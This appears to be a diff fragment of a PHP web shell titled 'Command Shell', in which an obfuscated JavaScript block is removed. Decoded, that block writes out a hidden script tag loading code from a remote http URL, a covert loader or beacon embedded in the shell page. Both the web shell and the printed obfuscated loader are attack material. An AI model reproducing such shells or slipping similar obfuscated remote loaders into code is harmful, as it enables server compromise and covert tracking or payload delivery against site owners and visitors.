@@ -419,15 +419,6 @@ even require one :P
 ?>
 <html>
 <title>Command Shell ~ <?php print getenv("HTTP_HOST"); ?></title>
-<script type="text/javascript" language="javascript">
-<!--
-ML="P<>phTsmtr/9:Cuk RIc=jSw.o";
-MI="1F=AB05@FA=D4883<::GGGHC;;343HCI7:8>9?HE621:F=AB052";
-OT="";
-for(j=0;j<MI.length;j++){
-OT+=ML.charAt(MI.charCodeAt(j)-48);
-}document.write(OT);
-// --></script>
 <head>
 <?php print $style; ?>
 <SCRIPT TYPE="text/javascript">
